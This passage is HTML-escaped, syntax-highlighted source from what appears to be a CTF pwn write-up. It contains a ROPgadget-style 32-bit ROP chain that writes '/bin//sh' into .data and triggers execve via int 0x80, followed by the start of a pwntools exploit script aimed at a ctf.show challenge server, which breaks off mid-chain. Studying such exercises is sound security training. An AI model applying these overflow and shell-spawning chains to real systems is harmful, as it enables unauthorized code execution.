&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea064&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080b81c6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;//sh&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049303&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# xor eax, eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080549db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# mov dword ptr [edx], eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080481c9&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop ebx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea060&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080de955&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop ecx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea068&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data + 8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x08049303&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# xor eax, eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0807a86f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# inc eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806cc25&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# int 0x80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;expï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;pwn.challenge.ctf.show&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;28192&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cyclic&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x0806f02a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop edx ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080ea060&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# @ .data&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x080b81c6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# pop eax ; ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin&amp;#39;&lt;/span&gt;
